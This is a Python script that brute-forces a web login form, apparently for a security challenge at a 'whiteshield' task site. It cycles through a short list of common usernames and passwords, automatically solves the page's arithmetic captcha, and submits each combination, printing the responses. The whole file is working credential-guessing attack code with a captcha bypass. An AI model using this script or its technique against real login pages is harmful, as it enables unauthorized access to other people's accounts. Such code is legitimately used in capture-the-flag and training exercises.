import mechanize
from bs4 import BeautifulSoup
import operator
usernames=["root","john","admin","printer"]
passwords=["password","1234","qwerty","admin"]


for u_element in usernames:
    br = mechanize.Browser()
    br.set_handle_robots(False)
    cookies = mechanize.CookieJar()
    br.set_cookiejar(cookies)
    br.addheaders = [('User-agent','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36')]
    br.set_handle_refresh(False)
    a=br.open("https://afeladat2017.whiteshield.net/login")
    # print("open:",a.read())
    br.select_form(nr=0)

    res = br.submit()
    html = res.read()
    soup = BeautifulSoup(html,"lxml")
    form = soup.find("form", action="/login")
    math= form.find("span", id="math").text
    math_input = form.find("input", id="id_captcha_1")  
    # print(form.text)

    succes_div = soup.find("div", class_="container")
    succes_text = succes_div.find("article").find("h1").text


    # print("math",math)
    Cap=[]

    first_math = int(math[0:1]) #(element) +
    # print("First math",first_math)
    second_math = int(math[2:-1]) # +(element ) without =
    web_operators = math[1]
    ops = {
    "+": operator.add,
    "-": operator.sub,
    "*": operator.mul,
    "/": operator.truediv
        }
    operators = ops[web_operators](first_math,second_math)
    str_operator = str(operators)
    All=[]
    User=[]
    Pass=[]
    f=br.select_form(action='/login')
    User.append(u_element)
    
    for p_element in passwords:
        f=br.select_form(action='/login')
        Pass.append(p_element)
        br.form['username'] = u_element 
        br.form['password'] =  p_element
        br.form['captcha_1'] = str_operator
        # print(br.form["username"])
        # print(br.form["password"])
        # print(br.form["captcha_1"])
        All.append([u_element,p_element,first_math,web_operators,second_math,operators])
        print(All[-1])
        # print(br.form)
        response=br.submit()
        print("Submit:",response.read())
        # if("Sucess" in response.read):
        #     print("Logged in")
        #     print(f"The password was:{Pass}")
        #     break
        # else: 
        #      print("Fail")
        

        # if "Success!".encode() in response.read():
        #     print("Logged in")
        #     print(f"The password was:{Pass}")

        # # #      # #failure->again    
        # else:
        #     print("fail")
        # #     pass



